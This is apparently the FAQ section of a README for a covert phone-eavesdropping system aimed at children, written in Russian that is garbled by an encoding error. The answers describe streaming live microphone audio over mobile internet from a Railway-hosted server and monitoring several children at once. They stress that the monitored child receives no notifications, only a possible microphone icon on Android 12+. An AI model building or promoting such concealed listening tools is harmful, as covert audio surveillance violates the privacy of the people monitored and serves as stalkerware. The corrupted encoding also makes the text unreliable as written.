**Q: –ë—É–¥–µ—Ç –ª–∏ —Ä–∞–±–æ—Ç–∞—Ç—å –æ—Ç –º–æ–±–∏–ª—å–Ω–æ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞?**
A: ‚úÖ –î–∞! –ö–∞–∫ —Ç–æ–ª—å–∫–æ —Å–µ—Ä–≤–µ—Ä –∑–∞–¥–µ–ø–ª–æ–µ–Ω –Ω–∞ Railway —Å –ø—É–±–ª–∏—á–Ω—ã–º URL.

**Q: –°–∫–æ–ª—å–∫–æ —Ç—Ä–∞—Ñ–∏–∫–∞ –ø–æ—Ç—Ä–µ–±–ª—è–µ—Ç?**
A: ~2-5 MB –∑–∞ –º–∏–Ω—É—Ç—É –ø—Ä–æ—Å–ª—É—à–∫–∏ (–∑–∞–≤–∏—Å–∏—Ç –æ—Ç –±–∏—Ç—Ä–µ–π—Ç–∞).

**Q: –†–µ–±–µ–Ω–æ–∫ —É–≤–∏–¥–∏—Ç —á—Ç–æ –µ–≥–æ —Å–ª—É—à–∞—é—Ç?**
A: –ù–∞ Android 12+ –º–æ–∂–µ—Ç –ø–æ—è–≤–∏—Ç—å—Å—è –∑–Ω–∞—á–æ–∫ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –≤ —Å—Ç–∞—Ç—É—Å-–±–∞—Ä–µ, –Ω–æ –Ω–∏–∫–∞–∫–∏—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –Ω–µ –±—É–¥–µ—Ç.

**Q: –ú–æ–∂–Ω–æ –ª–∏ —Å–ª—É—à–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –¥–µ—Ç–µ–π –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ?**
A: ‚úÖ –î–∞, —Å–∏—Å—Ç–µ–º–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã–µ —Å–µ—Å—Å–∏–∏.

---

**–°—Ç–∞—Ç—É—Å:** –°–µ—Ä–≤–µ—Ä–Ω–∞—è —á–∞—Å—Ç—å –≥–æ—Ç–æ–≤–∞ –∫ –¥–µ–ø–ª–æ—é. –ö–ª–∏–µ–Ω—Ç—Å–∫–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Ç—Ä–µ–±—É—é—Ç –¥–æ—Ä–∞–±–æ—Ç–∫–∏.
**–í–µ—Ä—Å–∏—è:** 3.1.0
**–î–∞—Ç–∞:** 2025-10-05
